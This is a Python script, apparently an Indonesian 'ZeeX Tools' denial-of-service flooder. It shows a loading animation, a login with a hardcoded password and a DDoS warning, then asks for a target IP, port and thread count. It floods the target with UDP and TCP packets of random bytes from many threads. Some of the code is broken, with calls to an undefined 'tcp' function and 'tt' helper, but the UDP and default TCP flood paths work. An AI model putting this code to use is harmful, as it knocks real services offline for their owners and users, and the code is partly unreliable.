import random
import socket
import threading
import socket
import argparse
import sys
import time
import os
import re 
import asyncio
import requests
import struct
import codecs
import os,sys

os.system("clear")
time.sleep(2)
print("LOADING")
animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

for i in range(len(animation)):
    time.sleep(1)
    sys.stdout.write("\r" + animation[i % len(animation)])
    sys.stdout.flush()

print("\033[91m")
time.sleep(1)
os.system("clear")
print("\033[92m")
print("""
===========================================
  _        ___     ____   ___   _   _
 | |      / _ \   / ___| |_ _| | \ | |
 | |     | | | | | |  _   | |  |  \| |
 | |___  | |_| | | |_| |  | |  | |\  |
 |_____|  \___/   \____| |___| |_| \_|
============================================
Login Security || ZeeX Tools
============================================""")
password ="ZeeX"
for i in range(3):
	usr = input("\033[92m[•] Username : \u001b[31m")
	pwd = input("\033[92m[•] Password : \u001b[31m")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("\033[92m[•] Mengecek Password !!!")
		break
	else:
		time.sleep(5)
		print("\033[92m[•] Mengecek Password !!!")
		time.sleep(5)
		print("\u001b[31m[•] Password Salah !!!")
		continue
time.sleep(5)
print("\033[92mSelamat \u001b[31m {}\033[92m, Anda Berhasil Login Menggunakan Password \u001b[31m{}".format(usr, pwd))
time.sleep(5)
os.system("clear")
print("\u001b[31m{√} Baca Bentar Bang!")
print("""\u001b[31m
|              WARNING!!!!               |
|                                        |
|DDOS MERUPAN HAL YANG ILEGAL KALAU LU   |
|ABUSE TANGGUNG SENDIRI AKIBAT NYA GUA   |
|GAK NAKUT NAKUTIN GUA CUMA PERINGATIN   |
|OKE JANGAN SAMPAI KALIAN ABUSE YA       |
|AUTHOR : ZEEX                           |""")
print("[•]Tunggu 5 Detik Bang")
time.sleep(5)
os.system("clear")
print("\033[1;32;40m>> TOOLS BY ZEEX <<")
time.sleep(1)
print("\033[1;32;40m>> DONT ABUSE TOOLS <<")
time.sleep(1)
print("\033[1;32;40m>> Join My Community <<")
time.sleep(3)
os.system("clear")

Data = [
 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('081e77da', 'hex_codec'),
 codecs.decode('081e4dda', 'hex_codec'),
 codecs.decode('021efd40', 'hex_codec'),
 codecs.decode('081e7eda', 'hex_codec')]

useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1"]

os.system("clear")
print("""
  _____        __  __     _____
 |__  /___  ___\ \/ /   _|__  /
   / // _ \/ _ \\  / | | | / / 
  / /|  __/  __//  \ |_| |/ /_ 
 /____\___|\___/_/\_\__, /____|
                    |___/      """)
print("\033[0m")
ip = str(input("\033[0m[ ====> ]\033[91mHOST/IP:"))
port = int(input("\033[0m[ ====> ]\033[91mPORT:"))
choice = str(input("\033[0m[ ====> ]\033[91mMETHOD UDP | TCP:"))
times = int(input("\033[0m[ ====> ]\033[91mPACKET:"))
threads = int(input("\033[0m[ ====> ]\033[91mTHREAD:"))
def run():
	data = random._urandom(808)
	i = random.choice(("\033[93m[ZEEX]","\033[93m[ZEEX]","\033[93m[ZEEX]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" \033[95mATTACK IP\033[0m%s \033[95mAND PORT\033[0m%s"%(ip,port))
		except:
			s.close()
			print("[•] WIBU")

def attack(ip, port, time, size):
    
    if time is None:
        time = float('inf')
    
    if port is not None:
        port = max(1, min(65535, port))
    
    fmt = 'Paket From ZeeX {ip} {port} {times} {threads} Down.'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports',
        time='{time} seconds'.format(time=time) if str(time).isdigit() else 'unlimited time',
        size=size
    )
    print(fmt)
    
    startup = tt()
    size = os.urandom(min(65500, size))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(size, (ip, port))

    print('Attack finished.')

def run2():
	data = random._urandom(818)
	i = random.choice(("\033[93m[ZEEX]","\033[93m[ZEEX]","\033[93m[ZEEX]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" \033[95mATTACK IP\033[0m%s \033[95mAND PORT\033[0m%s"%(ip,port))
		except:
			s.close()
			print("[•] WIBU")

def run3():
	data = random._urandom(808)
	i = random.choice(("\033[93m[ZEEX]","\033[93m[ZEEX]","\033[93m[ZEEX]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" \033[95mATTACK IP\033[0m%s \033[95mAND PORT\033[0m%s"%(ip,port))
		except:
			s.close()
			print("[•] WIBU")
def run4():
	data = random._urandom(818)
	i = random.choice(("\033[93m[ZEEX]","\033[93m[ZEEX]","\033[93m[ZEEX]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" \033[95mATTACK IP\033[0m%s \033[95mAND PORT\033[0m%s"%(ip,port))
		except:
			s.close()
			print("[•] WIBU")

def run5():
	data = random._urandom(808)
	i = random.choice(("\033[93m[ZEEX]","\033[93m[ZEEX]","\033[93m[ZEEX]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" \033[95mATTACK IP\033[0m%s \033[95mAND PORT\033[0m%s"%(ip,port))
		except:
			s.close()
			print("[•] WIBU")

def run6():
	data = random._urandom(818)
	i = random.choice(("\033[93m[ZEEX]","\033[93m[ZEEX]","\033[93m[ZEEX]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" \033[95mATTACK IP\033[0m%s \033[95mAND PORT\033[0m%s"%(ip,port))
		except:
			s.close()
			print("[•] WIBU")

def run7():
	data = random._urandom(808)
	i = random.choice(("\033[93m[ZEEX]","\033[93m[ZEEX]","\033[93m[ZEEX]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" \033[95mATTACK IP\033[0m%s \033[95mAND PORT\033[0m%s"%(ip,port))
		except:
			s.close()
			print("[•] WIBU")

def run8():
	data = random._urandom(818)
	i = random.choice(("\033[93m[ZEEX]","\033[93m[ZEEX]","\033[93m[ZEEX]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" \033[95mATTACK IP\033[0m%s \033[95mAND PORT\033[0m%s"%(ip,port))
		except:
			s.close()
			print("[•] WIBU")

for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = run)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = tcp)
        th.start()
    else:
        th = threading.Thread(target = run2)
        th.start()
        th = threading.Thread(target = run3)
        th.start()
        th = threading.Thread(target = run4)
        th.start()
        th = threading.Thread(target = run5)
        th.start()
        th = threading.Thread(target = run6)
        th.start()
        th = threading.Thread(target = run7)
        th.start()
        th = threading.Thread(target = run8)
        th.start()